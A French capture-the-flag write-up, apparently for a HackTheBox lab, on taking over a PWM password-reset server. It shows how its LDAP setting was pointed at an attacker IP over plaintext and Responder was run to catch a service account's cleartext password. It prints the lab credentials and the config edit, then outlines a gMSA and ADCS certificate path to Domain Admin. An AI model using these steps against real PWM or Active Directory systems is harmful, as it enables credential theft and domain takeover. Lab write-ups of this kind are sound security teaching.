# Capture de credentials LDAP via Responder

## <mark style="color:red;">🔑 PWM — Capture de credentials LDAP via Responder</mark>

### <mark style="color:blue;">C'est quoi PWM ?</mark>

**PWM** est une application web open source de **gestion de mots de passe en libre-service** pour Active Directory. Elle permet aux utilisateurs de réinitialiser leur propre mot de passe sans appeler le support IT.

Pour fonctionner, PWM doit se connecter à un serveur LDAP (l'Active Directory) avec un **compte de service** — et ces credentials sont stockés dans son fichier de configuration `PwmConfiguration.xml`.

***

### <mark style="color:blue;">Ce qu'on a fait, étape par étape</mark>

#### <mark style="color:$success;">Le contexte de départ</mark>

On avait cracké le hash bcrypt du mot de passe admin PWM (`rockon!`). Avec ce mot de passe, on peut accéder à l'interface d'administration de PWM :

```
https://pwm.fries.htb/pwm/private/config/login
```

***

#### <mark style="color:$success;">Étape 1 — Se connecter à l'interface admin PWM</mark>

On se connecte avec le mot de passe cracké. PWM nous donne accès à son panneau de configuration complet, y compris la possibilité de **télécharger et réuploader** le fichier de configuration.

***

#### <mark style="color:$success;">Étape 2 — Télécharger</mark> <mark style="color:$success;"></mark><mark style="color:$success;">`PwmConfiguration.xml`</mark>

Depuis l'interface admin, on télécharge le fichier de config. PWM affiche lui-même un avertissement :

> _"Warning: The configuration download file contains sensitive security information, including security credentials, handle with appropriate care."_

Ce fichier contient notamment la configuration de la connexion LDAP :

```xml
<setting key="ldap.serverUrls" ...>
  <label>LDAP Directories → Connection → LDAP URLs</label>
  <value>ldaps://DC01.fries.htb:636</value>
</setting>
```

PWM utilise cette URL pour s'y connecter avec un compte de service AD à chaque fois qu'il a besoin de vérifier des credentials ou de modifier des mots de passe.

***

#### <mark style="color:$success;">Étape 3 — Modifier le fichier pour rediriger vers notre machine</mark>

On édite le XML pour remplacer l'URL LDAP légitime par l'IP de notre Kali :

```xml
<!-- Avant (légitime) -->
<value>ldaps://DC01.fries.htb:636</value>

<!-- Après (malveillant) -->
<value>ldap://10.10.14.19:389</value>
```

**Deux points importants :**

| Changement              | Raison                                                                          |
| ----------------------- | ------------------------------------------------------------------------------- |
| `ldaps://` → `ldap://`  | Supprimer SSL. Responder ne sait pas déchiffrer TLS, il faut du trafic en clair |
| Port `636` → port `389` | 636 = LDAP over SSL, 389 = LDAP standard (celui que Responder écoute)           |

On réimporte ensuite le fichier modifié dans PWM via l'interface admin.

***

#### <mark style="color:$success;">Étape 4 — Lancer Responder</mark>

**Responder** est un outil qui se fait passer pour différents serveurs réseau (LDAP, HTTP, SMB, etc.) pour capturer des authentifications.

```bash
sudo responder -I tun0
```

Responder se met à écouter sur notre interface réseau, notamment sur le port 389 (LDAP).

***

#### <mark style="color:$success;">Étape 5 — PWM se reconnecte... vers nous</mark>

Dès que PWM tente de se reconnecter à son serveur LDAP (ce qui arrive automatiquement à intervalles réguliers, ou lors d'une action utilisateur), il contacte maintenant **notre machine** au lieu du vrai DC.

Notre faux serveur LDAP (Responder) répond "bonjour" et PWM lui envoie ses credentials pour s'authentifier — **en clair** puisqu'on a désactivé le SSL.

```
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
```

On obtient le mot de passe en clair du compte de service `svc_infra` !

***

### Schéma de l'attaque

```
AVANT (situation normale)
─────────────────────────
PWM ──── ldaps://DC01:636 ──► Active Directory DC01
         (chiffré TLS)         svc_infra s'authentifie


APRÈS (attaque)
───────────────
PWM ──── ldap://10.10.14.19:389 ──► Responder (notre Kali)
         (PAS de chiffrement)        Responder répond "OK"
                                     PWM envoie ses creds en clair
                                     → svc_infra : m6tneOMAh5p0wQ0d ✅
```

***

### <mark style="color:$success;">Pourquoi ça marche ?</mark>

PWM fait **confiance à sa configuration** pour savoir où se trouve le serveur LDAP. Il ne vérifie pas si l'URL a changé ou si le serveur est légitime — il se connecte simplement à l'adresse configurée et envoie ses credentials.

En changeant cette adresse, on exploite une **Server-Side Request Forgery (SSRF) via configuration** : on force le serveur à faire une requête vers une destination qu'on contrôle.

Le fait que `svc_infra` envoie son mot de passe **en clair** (et pas un hash) est dû à la suppression du SSL. En LDAP non-chiffré, les credentials `BIND` simples transitent en plaintext sur le réseau.

***

### Récap des outils

| Outil                  | Rôle                                          |
| ---------------------- | --------------------------------------------- |
| Interface admin PWM    | Modifier et réimporter la config              |
| `PwmConfiguration.xml` | Fichier contenant l'URL LDAP à rediriger      |
| **Responder**          | Faux serveur LDAP qui capture les credentials |

***

### Ce qu'on fait ensuite avec `svc_infra`

Le compte `svc_infra` avec le mot de passe `m6tneOMAh5p0wQ0d` est celui qui peut lire le mot de passe du compte gMSA (`gMSA_CA_prod$`), qui lui-même a `ManageCa` sur la CA ADCS — ce qui ouvre la porte à l'escalade ESC6+ESC16 vers Domain Admin.

```
svc_infra (mot de passe en clair)
    ↓
gMSADumper → hash NTLM de gMSA_CA_prod$
    ↓
Certipy ESC6+ESC16 → certificat Administrator
    ↓
Domain Admin ✅
```

***
